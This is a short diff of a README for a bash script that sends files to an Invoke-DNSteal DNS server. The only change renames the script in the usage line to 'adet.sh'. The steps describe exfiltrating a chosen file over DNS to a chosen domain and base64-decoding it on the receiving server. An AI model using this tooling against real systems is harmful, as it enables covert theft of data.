@@ -5,7 +5,7 @@ Bash script for sending file to Invoke-DNSteal server
 1. Run [Invoke-DNSteal.py](https://github.com/JoelGMSec/Invoke-DNSteal ) in your DNS server
 2. Use:
 ```
-./sendFileInvokeDNSteal.sh <file> <domain>
+./adet.sh <file> <domain>
 ```
 3. Decode the received file in base64
 ```
